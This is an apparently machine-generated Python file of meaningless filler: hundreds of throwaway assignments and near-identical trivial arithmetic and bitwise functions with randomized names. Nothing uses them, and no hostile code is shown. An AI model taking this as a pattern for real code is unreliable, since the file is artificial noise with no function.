_z354_4156670 = list(filter(lambda x: x % 2 == 0, range(16)))
_z27_6880366 = max(2147451724, 28056)
_z688_1458196 = list(reversed(range(4)))
_z481_1262776 = frozenset(range(2))
_z1255_9002429 = list(range(87))
_z900_6857195 = hex(2334210233)
_z1467_5694885 = max(3743608990, 15941)
_z1097_2390179, _ = divmod(2205144520, 6569)
_z1376_3793331 = 1569217899 + 41751
_z1409_3240964 = max(2153013888, 25954)
_z1448_4249077 = 852457428 & 3672
_z318_1275039 = set(range(7))
_z1076_8037920 = oct(1800155661)
_z26_5654498 = hex(805952168)
_z532_3377755 = sorted([501, 644])
_z1093_5027544 = str(3237278585)
_z544_8507823 = id(object())
_z1141_8637362 = id(object())
_z362_4221864 = tuple(range(4))
_z1019_9543184 = list(map(lambda x: x ^ 107, range(5)))
_z349_2536798 = list(enumerate(range(2)))
_z1204_4301962 = round(561.8333333678604, 1)
_z383_4715405 = tuple(range(3))
_z1130_5506266 = float(3332814637)
_z1215_6055632 = list(range(53))
_z1089_1806962 = 442665981 - 65206
_z85_9619405 = bytes([4])
_z705_4972840 = oct(3462316295)
_z198_1825206 = list(range(1))
_z1087_2691338 = list(range(2))
_z419_3598038 = list(filter(lambda x: x % 2 == 0, range(16)))
_z540_1240932 = abs(-2381319918)
_z552_8827249 = list(reversed(range(4)))
_z327_3268270 = bytearray([185])
_z568_9113191 = 1742232160 % 7638
_z710_4405133 = 1992304933 + 28227
_z706_7369391 = int(str(555708581))
_z709_4537194 = len(str(611029351))
_z508_5670500 = tuple(range(10))
_z1212_9995903 = float(625280002)
_z1484_2080848 = 653600989 + 52352
_z1096_9929968 = 2536263984 & 29587
_z1201_9265398 = 1252511829 - 28638
_z1243_8484520 = list(range(4))
_z91_2154255 = len(str(647425324))
_z332_7936209 = max(1474110126, 52398)
_z107_6805082 = min(2272413918, 50310)
_z1306_5796764 = max(2765843906, 1089)
_z77_4198054 = bytes([224])
_z78_5729685 = int(str(2182390297))
_z1011_1020570 = 3423673673 | 61530
_z66_8550310 = min(32667560, 36770)
_z801_2595326 = 4182568854 * 3
_z302_3958919 = 540802283 << 3
_z1113_7482511 = 191793430 >> 1
_z439_6470117 = len(str(2993055423))
_z1057_7096240 = pow(883660428, 2, 31537)
_z615_6689231 = list(enumerate(range(6)))
_z634_7314962 = list(filter(lambda x: x % 2 == 0, range(20)))
_z971_2704520 = hex(3473282610)
_z914_6351065 = frozenset(range(2))
_z1083_4494232 = list(map(lambda x: x ^ 187, range(2)))
_z823_7718123 = dict(zip(range(1), range(1)))
_z573_4999943 = list(reversed(range(9)))
_z1027_5485950 = 2976925293 + 52651
_z781_8665493 = bin(4042625168)
_z849_5154349 = 3336679879 | 45864
_z850_3525940 = abs(-3356760456)
_z204_5429916 = abs(-3255477913)
_z185_7205623 = slice(8, 16)
_z1429_9377444 = frozenset(range(2))
_z665_9127180 = 1070927618 ^ 60736
_z447_4451615 = list(zip(range(4), range(3)))
_z867_7167358 = list(filter(lambda x: x % 2 == 0, range(11)))
_z1461_7010606 = bytes([142])
_z1168_3844913 = pow(1519516683, 3, 93489)
_z912_2104954 = sorted([417, 267])
_z942_3698523 = abs(-3309408259)
_z808_8985948 = max(3750963705, 49476)
_z918_3156350 = 2404264259 & 35550
_z697_7437625 = hash(str(1066311356))
_z821_6695074 = max(1188409742, 49302)
_z956_5962760 = list(map(lambda x: x ^ 85, range(5)))
_z1229_9446241 = list(range(65))
_z1480_6921448 = -2931293350
_z1008_5609112 = ~981200676
_z173_7446041 = 2848283768 << 2
_z108_5382532 = list(map(lambda x: x ^ 207, range(3)))
_z681_1703430 = complex(79, 5)
_z425_4197962 = set(range(7))
_z556_4248581 = 2482097994 + 1572
_z1324_8416162 = frozenset(range(4))
_z164_4291193 = 3391275734 & 49120
_z1037_8613009 = list(zip(range(4), range(3)))
_z1050_1600003 = hash(str(572836786))
_z1384_4639981 = tuple(range(7))
_z1419_3916734 = pow(259569666, 5, 72495)
_z434_8429086 = oct(814306563)
_z64_6310284 = ~3846442003
_z1143_9233806 = ~3029107470
_z853_1415082 = sorted([442, 72])
_z846_6777217 = min(152962749, 19975)
_z163_6388422 = sorted([548, 761])
_z1074_3343175 = list(reversed(range(4)))
_z563_2597424 = max(2850463230, 45711)
_z387_3859883 = bytes([92])
_z361_1298001 = slice(2, 12)
_z1457_1190844 = pow(1225289816, 5, 65178)
_z1274_5167752 = bytes([218])
_z120_2592516 = round(893.5736796843858, 4)
_z195_7503603 = complex(38, 72)
_z531_6635058 = tuple(range(6))
_z341_4210418 = repr(1338353486)
_z1104_1790505 = min(2216715231, 20680)
_z475_6702992 = 3355267034 ^ 49972
_z890_6412655 = list(range(21))
_z102_6561804 = 2594852216 & 52244
_z864_9765011 = repr(1092498836)
_z497_3823407 = id(object())
_z861_6477723 = 529418468 * 5
_z1175_4830509 = 243838849 >> 2
_z181_6588491 = 2117077602 + 4824
_z426_5953137 = 3773361528 - 15588
_z1388_9735196 = list(enumerate(range(10)))
_z1296_3240400 = 963113600 + 33217
_z809_7152523 = 2747113563 + 53870
_z145_4630745 = 1612279076 + 41967
_z1134_9908391 = slice(10, 15)
_z1124_9520352 = slice(5, 17)
_z1261_1078565 = 1652996958 - 49445
_z1185_5540221 = 2259658824 >> 2
_z119_2369539 = 2578869570 | 59672
_z735_6102789 = hash(str(1666149897))
_z466_7500063, _ = divmod(2076834463, 2443)
_z1167_7564605 = ~962707027
_z558_1306758 = bytes([98])
_z88_3906828 = dict(zip(range(1), range(2)))
_z1378_4500963 = int(str(687175847))
_z147_5912044 = repr(225910763)
_z905_1091769 = hex(513375243)
_z587_1127881 = 2823111345 * 10
_z1203_8625687 = 3526207179 - 23624
_z738_4876746 = 4248383968 << 2
_z828_8750302 = float(4109985385)
_z760_8658967 = complex(13, 65)
_z398_7934584 = sorted([542, 823])
_z472_1875249 = 3040500030 >> 2
_z245_8691820, _ = divmod(2829354393, 4188)
_z959_9125921 = 3760543441 * 10
_z1127_5580119 = bytearray([12])
_z1364_6501776 = -3048214660
_z130_8450464 = int(str(1475150757))
_z329_3569308 = min(78780688, 50769)
_z1321_9116846 = 794220814 ^ 51098
_z451_6036064 = float(2260320979)
_z1316_8115299 = pow(346361788, 2, 49859)
_z1200_8406041 = int(str(2653672150))
_z170_8004734 = list(enumerate(range(3)))
_z1417_5026787 = hash(str(2889208926))
_z301_6704767 = dict(zip(range(1), range(2)))
_z691_9111794 = bytes([46])
_z325_6672747 = list(reversed(range(3)))
_z1444_2442355 = sum([3656411807, 54856])
_z343_2190295 = list(reversed(range(7)))
_z1470_3735345 = dict(zip(range(4), range(4)))
_z617_3338874 = str(2052115990)
_z1233_4247277 = list(range(6))
_z929_2990625 = list(enumerate(range(8)))
_z986_5317853 = list(map(lambda x: x ^ 112, range(2)))
_z911_4147598 = format(4232150989, 'x')
_z18_3523049 = hash(str(2623861602))
_z1043_9553596 = 2613339422 | 37708
_z264_6467257 = sorted([522, 376])
_z314_9006082 = int(str(3595989943))
_z802_1871922 = tuple(range(2))
_z211_9737982 = hash(str(963640415))
_z1278_5447353 = list(zip(range(4), range(2)))
_z924_9283920 = 3559236411 << 4
_z943_9811282 = 810269258 | 50648
_z115_1719232 = list(map(lambda x: x ^ 105, range(6)))
_z1392_2056735 = 492718789 >> 1
_z917_4936319 = int(str(156648717))
_z891_9958711 = len(str(852843486))
_z82_6436610 = frozenset(range(9))
_z826_1848425 = sorted([268, 294])
_z629_7842200 = list(reversed(range(7)))
_z1240_2959837 = bin(2857981594)
_z589_1154669 = format(2155551097, 'x')
_z379_5273257 = slice(8, 17)
_z881_2475134 = bytes([30])
_z158_9346410 = set(range(9))
_z1223_1798075 = 2239120685 << 2
_z1048_7064809 = tuple(range(5))
_z413_7504225 = hex(1570018725)
_z389_8756913 = bytearray([25])
_z244_1453446 = dict(zip(range(5), range(3)))
_z916_5879229 = bytearray([215])
_z727_2627270 = hex(3970969963)
_z1158_9807261 = float(2957712611)
_z1144_8084548 = round(645.9540418096794, 4)
_z1082_6198183 = dict(zip(range(3), range(5)))
_z1004_1687371 = 44335955 + 44892
_z415_8841572 = bin(256862248)
_z1169_4588222 = -3084098275
_z1351_7426042 = slice(0, 17)
_z1013_6483705 = complex(69, 10)
_z1284_7879716 = ~2660068921
_z988_5008496 = 560153803 % 6434
_z146_2816658 = 3625032097 * 0
_z930_1887837 = dict(zip(range(3), range(3)))
_z1335_3248873 = slice(4, 18)
_z311_6328511 = id(object())
_z624_7144625 = max(1691039019, 63142)
_z851_4676125 = tuple(range(8))
_z1140_1888297, _ = divmod(2359204237, 4970)
_z1107_6433644 = list(reversed(range(8)))
_z1208_5607454 = list(range(4))
_z575_3100930 = max(4183373142, 64499)
_z1191_6819752 = sum([3994894811, 54859])
_z224_4726465 = 59656083 & 47627
_z63_6590572 = list(map(lambda x: x ^ 9, range(6)))
_z1095_3167397 = 3669925372 ^ 38019
_z401_4139603 = 3142176976 & 6962
_z804_1285683 = complex(50, 52)
_z783_8757269 = format(2340644868, 'x')
_z685_2634614 = bytes([154])
_z355_9970504 = max(4227007622, 27496)
_z952_3552702 = 3424211039 * 2
_z742_8928382 = list(range(13))
_z1063_2392986 = list(filter(lambda x: x % 2 == 0, range(6)))
_z312_4300330 = 3405518421 >> 4
_z308_6049059 = list(filter(lambda x: x % 2 == 0, range(5)))
_z1123_7472445 = int(str(3407268086))
_z391_5630592 = str(4025340899)
_z728_2589302 = hash(str(2225386577))
_z1132_9321931 = list(map(lambda x: x ^ 98, range(6)))
_z762_5607747 = hash(str(3215589924))
_z1276_8518090 = slice(3, 19)
_z457_3500445 = hex(1309032688)
_z235_2345951 = str(1836620693)
_z1482_6664797 = frozenset(range(7))
_z50_7177832 = 2582190756 ^ 42658
_z1401_7948324 = dict(zip(range(4), range(5)))
_z521_1786287 = list(enumerate(range(8)))
_z651_7824302 = hash(str(647017380))
_z597_1882927 = 1878655654 % 1466
_z502_9461773 = 545753616 % 9955
_z777_6943716 = oct(1015733088)
_z963_4678005 = list(range(6))
_z1369_6412560 = 436182713 + 36217
_z154_5583981 = abs(-4068591071)
_z450_7598482 = bytearray([227])
_z523_9164549 = 915169212 | 55783
_z1098_7817031 = slice(6, 13)
_z228_5386431 = set(range(2))
_z932_5289438 = tuple(range(5))
_z1404_9878015 = 1206066270 % 2154
_z875_3202075 = str(2075561131)
_z79_8507760 = -329873485
_z553_9614392 = list(range(4))
_z31_6418392 = 1700571035 & 35326
_z1091_3460203 = min(746650609, 19810)
_z545_4092253 = bin(1337578304)
_z920_3530789 = pow(4086536418, 4, 85903)
_z1249_6775679 = id(object())
_z1047_7353186 = bytearray([220])
_z431_6018526 = bytes([245])
_z35_2729100 = max(24856661, 19677)
_z778_2639760 = hex(3560831504)
_z1020_3492553 = id(object())
_z719_9363228 = 793808223 >> 2
_z300_6084341 = list(filter(lambda x: x % 2 == 0, range(14)))
_z743_8370116 = str(2975655152)
_z832_8456093 = 370595355 % 5351
_z232_9368006 = sorted([307, 366])
_z392_3346687 = list(map(lambda x: x ^ 238, range(7)))
_z1425_1922472 = oct(3537273988)
_z904_1684181 = 3306972749 >> 4
_z1258_3944537 = 1706142744 ^ 33263
_z1442_9038635 = int(str(2894925041))
_z1331_2884361 = 3526559241 & 11231
_z945_9910630 = list(reversed(range(8)))
_z939_9996518 = 1116878723 & 31692
_z280_3055706 = frozenset(range(4))
_z487_2831634 = str(2168794190)
_z732_3604408 = set(range(6))
_z162_2439836 = bin(3374685392)
_z390_3828929 = id(object())
_z848_4414378 = list(zip(range(4), range(2)))
_z442_9589800 = oct(818766513)
_z152_4443061 = tuple(range(7))
_z69_5283938 = 4127858621 & 30885
_z857_3711002 = list(map(lambda x: x ^ 206, range(6)))
_z1189_7835406 = hex(363815304)
_z748_4377970 = min(3875580128, 21025)
_z406_3306521 = -965972586
_z333_2424698 = 1356380516 * 1
_z234_8766472 = 248449321 | 38336
_z994_5147715 = tuple(range(2))
_z1145_4975654 = int(str(3864489467))
_z585_6179716 = min(4237152513, 42775)
_z223_7679583 = list(filter(lambda x: x % 2 == 0, range(15)))
_z1114_8291359 = dict(zip(range(4), range(2)))
_z1285_8512093 = bin(3374100026)
_z1318_6358957 = 956568751 & 57348
_z578_3651227 = list(reversed(range(3)))
_z125_7348996 = list(zip(range(4), range(4)))
_z1070_2483835 = 1158045539 & 52340
_z1269_6550975 = sorted([766, 892])
_z1216_5662599 = 892746459 ^ 10601
_z48_4258669 = list(zip(range(3), range(1)))
_z1311_9291225 = sorted([419, 333])
_z194_9990846 = 3889683278 ^ 4256
_z504_3546833 = frozenset(range(3))
_z1186_6847207 = str(249454728)
_z961_7825399 = 4225570432 ^ 37478
_z785_2983607 = round(588.9339053988025, 2)
_z888_3540181 = list(reversed(range(9)))
_z835_4794818 = oct(613911520)
_z792_6118903 = 3340806086 - 29660
_z95_3605473 = 24265930 << 4
_z744_3736822 = id(object())
_z604_1563808 = slice(2, 12)
_z1146_6922559 = round(85.54900593959447, 5)
_z1406_6095868 = sum([4147529489, 61596])
_z766_7814663 = abs(-2959655210)
_z702_9320804 = ~1977959908
_z52_2856565 = list(zip(range(5), range(2)))
_z660_4866282 = 2130652452 ^ 55706
_z1251_7485534 = -2083661763
_z480_6249095 = repr(1774462778)
_z1359_7550242 = list(map(lambda x: x ^ 28, range(8)))
_z895_7432183 = bytearray([50])
_z1061_4401469 = hash(str(611485781))
_z468_4018372 = list(enumerate(range(5)))
_z680_9520294 = -1630755363
_z71_3235227 = slice(2, 19)
_z990_6042152 = tuple(range(9))
_z251_6147790 = int(str(3273953096))
_z183_8697522 = 172999422 + 23006
_z9_4725146 = 1565232817 >> 4
_z842_7166401 = list(map(lambda x: x ^ 74, range(2)))
_z373_4177530 = sorted([119, 757])
_z205_9980870 = int(str(1731689899))
_z73_2016148 = 3525921154 * 10
_z128_1815137 = round(696.25964266115, 1)
_z628_9561573 = bytearray([191])
_z1021_6330800 = 3032719218 | 30227
_z240_7152782 = abs(-4191963753)
_z409_7796572 = min(1536479965, 57798)
_z673_7386189 = str(1613414955)
_z229_9850837 = 2617675831 * 5
_z281_4390955 = ~2921445769
_z991_9587325 = list(range(77))
_z1397_7402589 = list(map(lambda x: x ^ 39, range(2)))
_z429_6746007 = list(range(6))
_z1486_3246686 = str(1529960664)
_z330_7471106 = 2623250862 * 7
_z1039_8741468 = bytearray([161])
_z1283_4572270 = hash(str(873011106))
_z376_3735793 = 1452588387 + 26266
_z878_7361447 = round(756.171991120332, 2)
_z86_7859661 = list(filter(lambda x: x % 2 == 0, range(13)))
_z157_5101589 = set(range(7))
_z1254_1006935 = pow(1250905591, 5, 53248)
_z676_8786739 = str(1037582810)
_z1358_9349892 = id(object())
_z134_6660667 = min(3462378571, 40491)
_z1288_8691312 = 2551922228 << 4
_z363_9212074 = 2107373084 | 22658
_z424_4569926 = ~2452452980
_z621_6482384 = -3287154062
_z746_7753763 = list(zip(range(3), range(5)))
_z530_5929781 = str(714076391)
_z687_9272512 = hash(str(214554493))
_z730_5726638 = hash(str(2974286031))
_z618_1630097 = oct(2020896288)
_z1423_3947862 = bytes([73])
_z1446_7615726 = oct(47511373)
_z1038_6753797 = hash(str(1627609322))
_z28_3988362 = set(range(8))
_z852_2989495 = -1762260880
_z219_8855361 = id(object())
_z860_7485615 = slice(10, 13)
_z114_4095010 = dict(zip(range(2), range(4)))
_z186_9541725 = frozenset(range(1))
_z574_9830857 = hex(1741311673)
_z256_1913387 = 3641314768 % 9747
_z515_5417878 = dict(zip(range(2), range(5)))
_z1459_1103285 = ~1753826437
_z7_2076982 = list(reversed(range(6)))
_z543_1412751 = complex(38, 50)
_z915_9127294 = repr(1537711558)
_z396_7796046 = 3846048083 - 57797
_z1474_3058132 = 4124112419 - 9608
_z689_6991379 = int(str(3270914397))
_z182_5124551, _ = divmod(2473741366, 2296)
_z101_9474120 = id(object())
_z331_5461890 = pow(3482896037, 5, 58434)
_z1138_2728468 = list(map(lambda x: x ^ 30, range(8)))
_z662_9622791 = len(str(1565657352))
_z337_6608568 = 1674155126 >> 1
_z1297_2085991 = round(274.8266499891713, 5)
_z796_9037997 = tuple(range(10))
_z1325_7913376 = 1725256572 - 54910
_z353_7887545 = 883546522 + 2000
_z1347_4202021 = min(2846773976, 15997)
_z166_2760699 = list(reversed(range(4)))
_z1109_2500792 = set(range(4))
_z1294_3275648 = abs(-1049780559)
_z1071_9941867 = id(object())
_z99_5646398 = format(3126476911, 'x')
_z11_4904204 = list(map(lambda x: x ^ 140, range(6)))
_z940_7465639 = sorted([159, 706])
_z491_8712339 = 735178700 | 24272
_z1121_3339308 = bytearray([157])
_z682_9483616 = 148881311 + 57210
_z381_9361298 = frozenset(range(2))
_z750_5975351 = min(2097619162, 40336)
_z141_2565988 = set(range(6))
_z340_2441725 = frozenset(range(9))
_z499_8305599 = 2149871504 | 12110
_z993_6300122 = slice(8, 15)
_z257_5575346 = float(2654994743)
_z206_2254606 = int(str(2614107591))
_z41_7099507 = max(2822502917, 54373)
_z263_1797832 = 2910464532 * 9
_z1022_8122393 = format(1369754462, 'x')
_z74_5211852 = abs(-2733758990)
_z976_6385184 = frozenset(range(5))
_z1291_3376302, _ = divmod(26797056, 1773)
_z839_1510350 = format(4117179824, 'x')
_z1315_2566162 = id(object())
_z770_2232548 = list(zip(range(4), range(2)))
_z1394_1869024 = list(range(4))
_z863_2218659 = 4266002349 >> 2
_z360_4424900 = id(object())
_z650_8242837 = format(504767654, 'x')
_z882_3398233 = pow(248106827, 4, 15940)
_z546_9654483 = int(str(392904764))
_z1382_6857436 = hash(str(3251697671))
_z790_9721918 = complex(43, 66)
_z637_4683221 = list(reversed(range(6)))
_z92_8661264 = id(object())
_z782_1501644, _ = divmod(1162762698, 206)
_z374_9219473 = abs(-692554864)
_z529_2400101 = repr(2298261274)
_z1366_7152936 = hex(1045628325)
_z949_4482653 = 3724987849 & 2506
_z461_5893047 = int(str(271109212))
_z549_4638606 = ~3186729517
_z526_4678609 = 1575984212 - 39867
_z873_6101998 = list(enumerate(range(6)))
_z649_8418014 = sorted([514, 422])
_z510_6285942 = str(4189244637)
_z951_3006422 = bytearray([254])
_z827_1186621 = -2336805250
_z1361_5567844 = -2528526229
_z669_8236358 = 3384014531 << 3
_z934_2881165 = format(2795698591, 'x')
_z1106_5133737 = list(range(52))
_z104_1893618 = bytes([180])
_z335_7305145 = list(range(8))
_z633_9283345 = list(range(21))
_z1477_7163153 = repr(3925825410)
_z699_2922141 = list(enumerate(range(3)))
_z271_1402512 = hash(str(2274609426))
_z1402_7676517 = 275841911 ^ 30250
_z612_4439049 = list(range(2))
_z400_1849990 = ~791148108
_z1202_2789601 = float(1230556308)
_z928_3592243 = pow(2514157847, 4, 90199)
_z1232_7230148 = abs(-2459651867)
_z833_8578137 = format(576150086, 'x')
_z769_4239482 = int(str(347590891))
_z616_3094888 = tuple(range(3))
_z1253_4378566 = bytes([232])
_z740_9623674 = float(2498837677)
_z288_7169875 = int(str(343057296))
_z883_2743748 = -3623672830
_z630_9833962 = abs(-540579055)
_z816_7318147 = hex(1077922727)
_z1007_1123996 = len(str(986343880))
_z315_3912502 = id(object())
_z1411_4251942 = 2049802445 >> 1
_z960_8056375 = list(filter(lambda x: x % 2 == 0, range(11)))
_z667_3494609 = 1463887719 % 6682
_z583_7100145 = oct(2944639442)
_z734_3686401 = hash(str(1574231043))
_z814_7358886 = list(enumerate(range(7)))
_z168_2830510 = slice(8, 10)
_z1111_2798059 = pow(2328072980, 4, 11440)
_z1068_6852093 = repr(1216628560)
_z156_2639310 = sum([2901212148, 54365])
_z1231_6677145 = sorted([430, 164])
_z17_2946346 = list(range(5))
_z1209_2929787 = list(enumerate(range(10)))
_z243_2771041 = sum([433404700, 7689])
_z260_9237145 = list(range(8))
_z847_5618710 = 3634271595 * 4
_z503_9119734 = 876477224 % 6612
_z692_1362282 = 1668256238 + 53762
_z1090_8419483 = dict(zip(range(3), range(3)))
_z571_7751045 = float(1784949855)
_z1078_1124712 = abs(-3701684838)
_z716_8447461 = list(enumerate(range(3)))
_z422_3368707 = frozenset(range(2))
_z527_7291770 = list(enumerate(range(8)))
_z1340_8501312 = float(2813333798)
_z305_4200516 = 1505467990 >> 4
_z1247_6127386 = bytes([112])
_z507_8107987 = 2882065108 ^ 5170
_z1413_5892751 = 1431948655 << 4
_z473_5642701 = list(map(lambda x: x ^ 20, range(5)))
_z877_7715625 = 1282897234 + 33861
_z496_1306470 = hash(str(2813009230))
_z648_7380568 = 3297805544 * 7
_z1116_1704932 = complex(64, 13)
_z996_4753899 = tuple(range(10))
def _f82_241001(_a82, _b82):
    if _a82 > _b82:
        return _a82 - _b82
    return _b82 - _a82
def _f97_829275(_a97, _b97):
    _c97 = _a97 ^ _b97
    return _c97 | 52832
def _f295_346127(_a295, _b295):
    _c295 = _a295 ^ _b295
    return _c295 | 22881
def _f108_450809(_a108, _b108):
    _c108 = _a108 * _b108
    return _c108 & 0xFFFFFFFF
def _f233_875293(_a233, _b233):
    _c233 = [_a233, _b233]
    return sum(_c233)
def _f337_269097(_a337, _b337):
    _c337 = _a337 + _b337
    return _c337 ^ 1426
def _f190_262553(_a190, _b190):
    return max(_a190, _b190) ^ min(_a190, _b190)
def _f64_749532(_a64, _b64):
    return (_a64 << 3) ^ (_b64 >> 2)
def _f251_941814(_a251, _b251):
    _c251 = _a251 ^ _b251
    return _c251 | 26023
def _f349_451897(_a349, _b349):
    _c349 = 0
    for _ in range(2):
        _c349 ^= _a349 + _b349
    return _c349
def _f269_526110(_a269, _b269):
    if _a269 > _b269:
        return _a269 - _b269
    return _b269 - _a269
def _f348_537930(_a348, _b348):
    _c348 = 0
    for _ in range(7):
        _c348 ^= _a348 + _b348
    return _c348
def _f203_613412(_a203, _b203):
    _c203 = _a203 ^ _b203
    return _c203 | 21637
def _f88_365159(_a88, _b88):
    return (_a88 << 3) ^ (_b88 >> 2)
def _f286_193721(_a286, _b286):
    _c286 = _a286 ^ _b286
    return _c286 | 33973
def _f94_218650(_a94, _b94):
    return (_a94 << 3) ^ (_b94 >> 2)
def _f163_836448(_a163, _b163):
    _c163 = _a163 * _b163
    return _c163 & 0xFFFFFFFF
def _f25_221588(_a25, _b25):
    return max(_a25, _b25) ^ min(_a25, _b25)
def _f374_261169(_a374, _b374):
    return max(_a374, _b374) ^ min(_a374, _b374)
def _f270_295726(_a270, _b270):
    _c270 = _a270 * _b270
    return _c270 & 0xFFFFFFFF
def _f140_243591(_a140, _b140):
    return (_a140 << 3) ^ (_b140 >> 2)
def _f33_589760(_a33, _b33):
    _c33 = _a33 ^ _b33
    return _c33 | 3678
def _f376_495684(_a376, _b376):
    _c376 = _a376 ^ _b376
    return _c376 | 27454
def _f18_723726(_a18, _b18):
    _c18 = _a18 * _b18
    return _c18 & 0xFFFFFFFF
def _f24_996275(_a24, _b24):
    _c24 = _a24 ^ _b24
    return _c24 | 17762
def _f79_646451(_a79, _b79):
    if _a79 > _b79:
        return _a79 - _b79
    return _b79 - _a79
def _f128_973998(_a128, _b128):
    _c128 = [_a128, _b128]
    return sum(_c128)
def _f84_746337(_a84, _b84):
    _c84 = _a84 * _b84
    return _c84 & 0xFFFFFFFF
def _f139_821987(_a139, _b139):
    return (_a139 << 3) ^ (_b139 >> 2)
def _f322_521532(_a322, _b322):
    return max(_a322, _b322) ^ min(_a322, _b322)
def _f68_914764(_a68, _b68):
    return (_a68 << 3) ^ (_b68 >> 2)
def _f319_266390(_a319, _b319):
    return (_a319 << 3) ^ (_b319 >> 2)
def _f73_138357(_a73, _b73):
    _c73 = [_a73, _b73]
    return sum(_c73)
def _f116_517722(_a116, _b116):
    _c116 = [_a116, _b116]
    return sum(_c116)
def _f42_945770(_a42, _b42):
    return (_a42 << 3) ^ (_b42 >> 2)
def _f213_778231(_a213, _b213):
    _c213 = [_a213, _b213]
    return sum(_c213)
def _f51_987913(_a51, _b51):
    _c51 = _a51 ^ _b51
    return _c51 | 43918
def _f386_289852(_a386, _b386):
    _c386 = 0
    for _ in range(3):
        _c386 ^= _a386 + _b386
    return _c386
def _f350_682999(_a350, _b350):
    return (_a350 << 3) ^ (_b350 >> 2)
def _f312_978889(_a312, _b312):
    _c312 = _a312 * _b312
    return _c312 & 0xFFFFFFFF
def _f387_632184(_a387, _b387):
    _c387 = _a387 ^ _b387
    return _c387 | 32529
def _f338_575182(_a338, _b338):
    _c338 = 0
    for _ in range(8):
        _c338 ^= _a338 + _b338
    return _c338
def _f212_229716(_a212, _b212):
    return max(_a212, _b212) ^ min(_a212, _b212)
def _f238_646246(_a238, _b238):
    _c238 = _a238 + _b238
    return _c238 ^ 21298
def _f122_650235(_a122, _b122):
    _c122 = _a122 + _b122
    return _c122 ^ 58608
def _f120_993253(_a120, _b120):
    return max(_a120, _b120) ^ min(_a120, _b120)
def _f40_908202(_a40, _b40):
    return max(_a40, _b40) ^ min(_a40, _b40)
def _f153_170814(_a153, _b153):
    return max(_a153, _b153) ^ min(_a153, _b153)
def _f0_213644(_a0, _b0):
    _c0 = _a0 * _b0
    return _c0 & 0xFFFFFFFF
def _f346_544277(_a346, _b346):
    _c346 = _a346 + _b346
    return _c346 ^ 2642
def _f169_150478(_a169, _b169):
    _c169 = _a169 * _b169
    return _c169 & 0xFFFFFFFF
def _f69_427107(_a69, _b69):
    _c69 = 0
    for _ in range(2):
        _c69 ^= _a69 + _b69
    return _c69
def _f77_274337(_a77, _b77):
    _c77 = 0
    for _ in range(4):
        _c77 ^= _a77 + _b77
    return _c77
def _f221_132533(_a221, _b221):
    if _a221 > _b221:
        return _a221 - _b221
    return _b221 - _a221
def _f166_961032(_a166, _b166):
    _c166 = _a166 + _b166
    return _c166 ^ 35811
def _f388_409337(_a388, _b388):
    _c388 = [_a388, _b388]
    return sum(_c388)
def _f279_888598(_a279, _b279):
    return (_a279 << 3) ^ (_b279 >> 2)
def _f225_851593(_a225, _b225):
    _c225 = _a225 * _b225
    return _c225 & 0xFFFFFFFF
def _f156_350040(_a156, _b156):
    return (_a156 << 3) ^ (_b156 >> 2)
def _f57_301235(_a57, _b57):
    _c57 = [_a57, _b57]
    return sum(_c57)
def _f393_507442(_a393, _b393):
    return max(_a393, _b393) ^ min(_a393, _b393)
def _f1_861676(_a1, _b1):
    return (_a1 << 3) ^ (_b1 >> 2)
def _f364_837976(_a364, _b364):
    _c364 = 0
    for _ in range(3):
        _c364 ^= _a364 + _b364
    return _c364
def _f78_754910(_a78, _b78):
    _c78 = _a78 ^ _b78
    return _c78 | 12133
def _f85_275831(_a85, _b85):
    _c85 = _a85 * _b85
    return _c85 & 0xFFFFFFFF
def _f16_575301(_a16, _b16):
    if _a16 > _b16:
        return _a16 - _b16
    return _b16 - _a16
def _f378_355601(_a378, _b378):
    _c378 = _a378 ^ _b378
    return _c378 | 26953
def _f186_628300(_a186, _b186):
    _c186 = _a186 + _b186
    return _c186 ^ 53413
def _f53_773573(_a53, _b53):
    _c53 = _a53 ^ _b53
    return _c53 | 63525
def _f23_581371(_a23, _b23):
    return (_a23 << 3) ^ (_b23 >> 2)
def _f45_451251(_a45, _b45):
    return max(_a45, _b45) ^ min(_a45, _b45)
def _f239_512539(_a239, _b239):
    _c239 = 0
    for _ in range(4):
        _c239 ^= _a239 + _b239
    return _c239
def _f174_739490(_a174, _b174):
    _c174 = _a174 + _b174
    return _c174 ^ 32424
def _f20_184217(_a20, _b20):
    _c20 = 0
    for _ in range(6):
        _c20 ^= _a20 + _b20
    return _c20
def _f101_200476(_a101, _b101):
    _c101 = _a101 + _b101
    return _c101 ^ 30516
def _f182_901872(_a182, _b182):
    return max(_a182, _b182) ^ min(_a182, _b182)
def _f228_499373(_a228, _b228):
    if _a228 > _b228:
        return _a228 - _b228
    return _b228 - _a228
def _f297_524138(_a297, _b297):
    if _a297 > _b297:
        return _a297 - _b297
    return _b297 - _a297
def _f117_844485(_a117, _b117):
    _c117 = 0
    for _ in range(2):
        _c117 ^= _a117 + _b117
    return _c117
def _f381_543206(_a381, _b381):
    return (_a381 << 3) ^ (_b381 >> 2)
def _f47_251674(_a47, _b47):
    _c47 = [_a47, _b47]
    return sum(_c47)
def _f175_848550(_a175, _b175):
    _c175 = _a175 * _b175
    return _c175 & 0xFFFFFFFF
def _f210_994432(_a210, _b210):
    _c210 = _a210 ^ _b210
    return _c210 | 41242
def _f207_474039(_a207, _b207):
    _c207 = 0
    for _ in range(6):
        _c207 ^= _a207 + _b207
    return _c207
def _f365_202079(_a365, _b365):
    _c365 = _a365 * _b365
    return _c365 & 0xFFFFFFFF
def _f324_950685(_a324, _b324):
    _c324 = _a324 + _b324
    return _c324 ^ 30607
def _f145_215833(_a145, _b145):
    _c145 = [_a145, _b145]
    return sum(_c145)
def _f178_158237(_a178, _b178):
    if _a178 > _b178:
        return _a178 - _b178
    return _b178 - _a178
def _f192_950255(_a192, _b192):
    return max(_a192, _b192) ^ min(_a192, _b192)
def _f37_406077(_a37, _b37):
    _c37 = _a37 ^ _b37
    return _c37 | 16414
def _f291_123578(_a291, _b291):
    _c291 = _a291 * _b291
    return _c291 & 0xFFFFFFFF
def _f95_126633(_a95, _b95):
    _c95 = _a95 ^ _b95
    return _c95 | 53102
def _f91_929435(_a91, _b91):
    if _a91 > _b91:
        return _a91 - _b91
    return _b91 - _a91
def _f352_734946(_a352, _b352):
    return max(_a352, _b352) ^ min(_a352, _b352)
def _f244_925928(_a244, _b244):
    _c244 = [_a244, _b244]
    return sum(_c244)
def _f327_262087(_a327, _b327):
    _c327 = _a327 ^ _b327
    return _c327 | 18919
def _f366_353311(_a366, _b366):
    return (_a366 << 3) ^ (_b366 >> 2)
def _f372_244171(_a372, _b372):
    _c372 = _a372 + _b372
    return _c372 ^ 42977
